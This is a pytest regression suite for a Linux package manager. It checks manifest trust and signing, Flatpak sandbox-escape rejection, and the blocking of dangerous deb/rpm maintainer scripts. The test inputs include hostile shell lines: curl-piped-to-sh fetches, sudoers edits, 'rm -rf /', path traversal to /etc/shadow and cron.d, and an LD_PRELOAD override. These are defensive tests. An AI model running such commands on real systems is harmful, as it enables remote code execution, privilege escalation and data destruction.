"""Regression tests for the Phase 2 adversarial review."""

import json

import pytest
from pydantic import ValidationError

from cygnus.core import planner
from cygnus.core.backends import aur, foreign
from cygnus.core.backends import flatpak as fb
from cygnus.core.backends.appimage import version_key
from cygnus.core.health.engine import Health, InstallContext, evaluate
from cygnus.core.health.probes import ProbeOutcome, ProbeStatus
from cygnus.core.manifest import catalog, signing
from cygnus.core.manifest.schema import Manifest
from cygnus.core.models import Candidate, PackageFormat
from cygnus.core.registry.db import StorageLocation

CAT = catalog.bundled_manifests()
WP_RAW = (catalog.resources.files("cygnus.data") / "manifests/org.whatpulse.WhatPulse.json").read_text()
HE_RAW = (catalog.resources.files("cygnus.data") / "manifests/net.imput.helium.json").read_text()


def test_vendor_key_cannot_claim_foreign_app_ids():
    d = json.loads(HE_RAW)
    d["application"].update(id="org.whatpulse.WhatPulse", flatpak_ids=["org.mozilla.firefox"],
                            vendor={"name": "Evil", "domain": "evil.example"})
    raw = json.dumps(d).encode()
    priv, pub = signing.generate_keypair()
    ts = catalog.TrustStore()
    ts.add(pub, "evil.example", "vendor-signed")
    lm = catalog.load(raw, origin="network", signature=signing.sign(raw, priv, pub, "c"), trust=ts)
    assert lm.trust_level == "unverified" and not lm.can_drive_actions
    assert any("outside that domain" in w for w in lm.warnings)


def test_vendor_key_for_own_domain_ids_is_trusted():
    d = json.loads(WP_RAW)
    raw = json.dumps(d).encode()
    priv, pub = signing.generate_keypair()
    ts = catalog.TrustStore()
    ts.add(pub, "whatpulse.org", "vendor-signed")
    assert catalog.load(raw, origin="network", signature=signing.sign(raw, priv, pub, "c"),
                        trust=ts).trust_level == "vendor-signed"


def test_curated_manifest_wins_identity_collisions():
    evil = catalog.load(WP_RAW.encode(), origin="import")
    merged = {"evil": evil, **CAT}
    assert catalog.find_for({"flatpak_id": "org.whatpulse.WhatPulse"}, merged).trust_level == "curated"


@pytest.mark.parametrize("perm", ["--talk-name=org.freedesktop.Flatpak", "--filesystem=host", "--socket=system-bus",
                                  "--filesystem=xdg-config/autostart", "--device=all",
                                  "--system-talk-name=org.freedesktop.systemd1", "--env=LD_PRELOAD=/x.so"])
def test_override_escapes_rejected(perm):
    d = json.loads(WP_RAW)
    d["components"][0]["post"] = [{"kind": "flatpak.override", "app": "org.whatpulse.WhatPulse",
                                   "permissions": [perm]}]
    with pytest.raises(ValidationError):
        Manifest.model_validate(d)


def test_override_targets_only_own_app_and_flatpak_refs_are_strict():
    d = json.loads(WP_RAW)
    d["components"][0]["post"] = [{"kind": "flatpak.override", "app": "org.mozilla.firefox",
                                   "permissions": ["--share=network"]}]
    with pytest.raises(ValidationError):
        Manifest.model_validate(d)
    d = json.loads(WP_RAW)
    d["components"][0]["post"] = [{"kind": "flatpak.install", "ref": "--from=https://evil/x.flatpakref",
                                   "remote": "--no-gpg-verify"}]
    with pytest.raises(ValidationError):
        Manifest.model_validate(d)


@pytest.mark.parametrize("path", ["~/", "~/.", "~//", "$XDG_EVIL/x", "~/.config", "~/a/../.."])
def test_user_data_paths_must_name_a_folder(path):
    d = json.loads(WP_RAW)
    d["user_data"]["paths"] = [path]
    with pytest.raises(ValidationError):
        Manifest.model_validate(d)


def test_naive_expiry_rejected_cleanly():
    d = json.loads(WP_RAW)
    d["expires"] = "2027-04-06T00:00:00"
    with pytest.raises(catalog.ManifestError):
        catalog.load(json.dumps(d).encode(), origin="import")


# -- planner trust gate and signature enforcement ------------------------------------------------------
SSD = StorageLocation(id="ssd", label="SSD", fs_uuid="a", fs_type="btrfs", location_class="system")
HDD = StorageLocation(id="hdd", label="HDD", fs_uuid="b", fs_type="ntfs3", location_class="user-owned",
                      capabilities={"exec_allowed": True, "chmod_persists": True})


def appimage_cand():
    return Candidate(format=PackageFormat.APPIMAGE, source="/x.AppImage", name="Helium", metadata={"file_size": 1})


@pytest.mark.parametrize("status", ["unsigned", "error", None, "wrong-key"])
def test_pinned_signature_cannot_be_downgraded(status):
    plan = planner.plan_appimage(appimage_cand(), HDD, SSD, manifest=CAT["net.imput.helium"],
                                 signature_status=status, health_probe=lambda c: False)
    assert plan.blocked and plan.issues[0].code == "APPIMAGE_SIGNATURE_INVALID"


def test_unverified_manifest_proposes_no_actions():
    unverified = catalog.load(WP_RAW.encode(), origin="import")
    plan = planner.plan_appimage(appimage_cand(), HDD, SSD, manifest=unverified, health_probe=lambda c: False)
    assert plan.components and all(not c.actions for c in plan.components)


def test_unknown_evidence_is_not_broken():
    def probe(spec):
        return ProbeOutcome(probe=spec["probe"], status=ProbeStatus.UNKNOWN, evidence="no data")

    ctx = InstallContext(source_id="appimage", format="appimage", payload_path=__file__)
    import os
    os.chmod(__file__, 0o755)
    try:
        h = evaluate(CAT["net.imput.helium"].manifest, ctx, probe=probe)
    finally:
        os.chmod(__file__, 0o644)
    assert h.overall is Health.UNKNOWN


# -- AUR / foreign / flatpak / versions --------------------------------------------------------------------
def test_aur_split_packages_build_once_and_provides_fallback():
    db = {"app": {"Name": "app", "PackageBase": "app", "Depends": ["libbar", "app-data"], "Maintainer": "m"},
          "app-data": {"Name": "app-data", "PackageBase": "app", "Maintainer": "m"},
          "libbar-git": {"Name": "libbar-git", "PackageBase": "libbar-git", "Maintainer": "m"}}
    plan = aur.resolve(["app"], satisfy=lambda deps: {d: {"installed": None, "repo": None} for d in deps},
                       fetch_info=lambda names: {n: db[n] for n in names if n in db},
                       find_provider=lambda n: "libbar-git" if n == "libbar" else None, now=0)
    assert plan.build_order == ["libbar-git", "app"] and not plan.unresolvable


@pytest.mark.parametrize("line", ['doas sh -c "$(curl x)"', "X=$(curl x | sh)", "docker run x",
                                  "echo ALL >> /etc/sudoers", "rm -rf --no-preserve-root /", "usermod -aG wheel u"])
def test_dangerous_script_lines_block_conversion(line):
    assert foreign.classify_scripts({"postinst": line}).blocks_auto_conversion


def test_lua_scriptlets_block():
    a = foreign.classify_scripts({"postin": "print('x')"}, {"postin": "<lua>"})
    assert a.blocks_auto_conversion


def test_permission_audit_finds_escapes():
    meta = {"permissions": {"filesystems": "host;xdg-config/autostart", "sockets": "system-bus"},
            "session_bus": {"org.freedesktop.Flatpak": "talk"}, "system_bus": {}}
    escapes, _ = fb.permission_audit(meta)
    assert len(escapes) == 4


def test_flatpakrepo_compared_by_url():
    class Env:
        def remotes(self):
            from types import SimpleNamespace
            return [(None, SimpleNamespace(get_url=lambda: "https://dl.flathub.org/repo/"))]

    fetch = lambda url, **k: b"[Flatpak Repo]\nUrl=https://dl.flathub.org/repo/\n"  # noqa: E731
    assert fb._repo_configured("https://dl.flathub.org/repo/flathub.flatpakrepo", Env(), fetch=fetch)


@pytest.mark.parametrize("older,newer", [("2.0.0-beta.1", "2.0.0"), ("0.4.5-rc1", "0.4.5"), ("1.9", "1.10"),
                                         ("1.0.0-beta", "1.0.0-2"), ("6.3.2", "7.0-beta4"), ("1.0-rc1", "1.0-rc2")])
def test_version_ordering(older, newer):
    assert version_key(older) < version_key(newer)


@pytest.mark.parametrize("line", ["command rm -rf /usr/share/foo", "command -p rm -rf /var/lib/foo",
                                  "trap 'rm -rf /var/lib/foo' EXIT", "trap cleanup EXIT", "rm -f $DEST/foo.conf",
                                  'rm -f "${PREFIX}/x"', "rm -f ../../etc/shadow", "ln -s /x ../etc/foo",
                                  "cp x /usr/share/../../etc/cron.d/x", "useradd -r foo", "groupadd foo"])
def test_lines_whose_effect_conversion_cannot_reproduce_block_it(line):
    assert foreign.classify_scripts({"postinst": line}).blocks_auto_conversion, line


@pytest.mark.parametrize("line", ["command -v update-desktop-database >/dev/null", "trap - EXIT", "trap '' INT",
                                  "rm -f /usr/share/foo/old.cache", "mkdir -p /opt/foo/data",
                                  "if command -v ldconfig; then ldconfig; fi"])
def test_harmless_lines_still_convert(line):
    assert not foreign.classify_scripts({"postinst": line}).blocks_auto_conversion, line


def test_a_script_too_large_to_read_blocks_conversion():
    from cygnus.core.models import Candidate, PackageFormat

    cand = Candidate(format=PackageFormat.DEB, source="x.deb", name="big", version="1", arch="x86_64",
                     metadata={"maintainer_scripts": {}, "uninspected_scripts": ["postinst"]})
    verdict = foreign.analyse(cand, inspect_payload=False, find_alternatives=None)
    assert verdict.strategy == "review" and any("too large to inspect" in u for u in verdict.scripts.unknown)


def test_oversized_maintainer_scripts_are_recorded_by_the_detectors(tmp_path):
    import builders
    from cygnus.core.detect import detect_file

    big = "#!/bin/sh\n" + "echo padding\n" * 50_000 + "curl https://example.invalid/x | sh\n"  # ~650 KB
    (tmp_path / "d").mkdir()
    deb = detect_file(str(builders.build_deb(tmp_path / "d", scripts={"postinst": big})))
    assert deb.metadata["uninspected_scripts"] == ["postinst"]
    (tmp_path / "r").mkdir()
    rpm = detect_file(str(builders.build_rpm(tmp_path / "r", postin=big)))
    assert rpm.metadata["uninspected_scripts"] == ["postin"]
    for cand in (deb, rpm):
        assert foreign.analyse(cand, inspect_payload=False, find_alternatives=None).strategy == "review"


def test_a_requested_package_can_provide_another_requested_packages_dependency():
    db = {"app": {"Name": "app", "PackageBase": "app", "Version": "1-1", "Depends": ["libbar"]},
          "libbar-git": {"Name": "libbar-git", "PackageBase": "libbar-git", "Version": "1-1", "Provides": ["libbar"]}}
    plan = aur.resolve(["app", "libbar-git"], satisfy=lambda deps: {d: {"installed": None, "repo": None} for d in deps},
                       fetch_info=lambda names: {n: db[n] for n in names if n in db},
                       find_provider=lambda n: "libbar-git" if n == "libbar" else None, now=0)
    assert not plan.unresolvable and plan.build_order == ["libbar-git", "app"]
